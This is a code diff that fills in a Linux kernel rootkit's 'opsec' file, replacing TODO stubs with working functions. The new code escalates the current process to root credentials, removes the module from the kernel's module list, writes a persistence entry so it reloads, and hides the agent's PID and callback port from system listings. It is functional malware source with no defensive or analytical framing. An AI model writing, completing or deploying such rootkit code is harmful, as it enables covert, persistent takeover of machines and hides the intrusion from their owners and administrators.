@@ -1,51 +1,101 @@
 // SPDX-License-Identifier: GPL-2.0
-//
-// Auto-OPSEC and module cloaking.
-//
-// On each callback connection, auto-hides the agent kthread PID and
-// the local source port. Restores visibility on disconnect.
-// Module cloaking removes THIS_MODULE from the kernel module list.
-//
+// core/opsec.c - Escalation, module cloaking, persistence.
+#include <linux/cred.h>
+#include <linux/fs.h>
 #include <linux/list.h>
 #include <linux/module.h>
 #include <linux/sched.h>
-#include <linux/string.h>
 #include <net/inet_sock.h>
-
 #include "rootkit.h"
 
-// Module cloaking state
-static struct list_head *saved_prev;
-bool rk_module_hidden;
+// Privilege escalation
+int rk_escalate(void)
+{
+	struct cred *new_cred;
 
-// Persistence tracking
-bool rk_persist_active;
+	new_cred = prepare_kernel_cred(&init_task);
+	if (!new_cred)
+		return -ENOMEM;
+	return commit_creds(new_cred);
+}
 
-// Saved values for auto-unhide on disconnect
-static char auto_pid_str[16];
-static bool auto_pid_active;
-static unsigned short auto_port_val;
-static bool auto_port_active;
+// Module cloaking
+static struct list_head *saved_mod_list;
 
+void rk_cloak(void)
+{
+	if (saved_mod_list)
+		return;
+	saved_mod_list = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+}
+
+void rk_uncloak(void)
+{
+	if (!saved_mod_list)
+		return;
+	list_add(&THIS_MODULE->list, saved_mod_list);
+	saved_mod_list = NULL;
+}
+
+// Persistence
+int rk_persist(void)
+{
+	struct file *f;
+	loff_t pos = 0;
+
+	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
+	filp_close(f, NULL);
+	return 0;
+}
+
+int rk_unpersist(void)
+{
+	struct file *f;
+
+	f = filp_open(PERSIST_PATH, O_WRONLY | O_TRUNC, 0);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
+	filp_close(f, NULL);
+	return 0;
+}
+
+// Auto-hide agent PID and connection port on connect.
 void rk_auto_hide(struct socket *sock)
 {
-	// TODO: Hide kthread PID (snprintf current->pid, rk_target_add)
-	// and local source port (inet_sk(sock->sk)->inet_sport via ntohs,
-	// rk_port_add). Save values for cleanup.
+	struct inet_sock *inet = inet_sk(sock->sk);
+	char buf[8];
+
+	// Hide the agent kthread PID
+	snprintf(buf, sizeof(buf), "%d", current->pid);
+	rk_target_add(&rk_pid_targets, buf);
+
+	// Hide the local source port from tcp seq show
+	snprintf(buf, sizeof(buf), "%hu", ntohs(inet->inet_sport));
+	rk_target_add(&rk_port_targets, buf);
 }
 
+// Remove auto-hidden entries on disconnect.
 void rk_auto_unhide(void)
 {
-	// TODO: Remove auto-hidden port and PID (reverse order).
-	// Use the saved values to call rk_port_remove / rk_target_remove.
-}
+	char buf[8];
+	int i;
 
-void rk_cloak_module(void)
-{
-	// TODO: Save THIS_MODULE->list.prev, list_del_init, set flag
-}
+	// Remove agent PID
+	snprintf(buf, sizeof(buf), "%d", current->pid);
+	for (i = 0; i < rk_pid_targets.count; i++) {
+		if (strcmp(rk_pid_targets.targets[i], buf) == 0) {
+			rk_target_remove(&rk_pid_targets, i);
+			break;
+		}
+	}
 
-void rk_uncloak_module(void)
-{
-	// TODO: list_add back to saved_prev, clear flag
+	// Remove source port (port changes each connection, just remove all auto entries)
+	// Since we always add at the end and there's typically only one agent connection,
+	// remove the last port entry (the one we added)
+	if (rk_port_targets.count > 0)
+		rk_target_remove(&rk_port_targets, rk_port_targets.count - 1);
 }
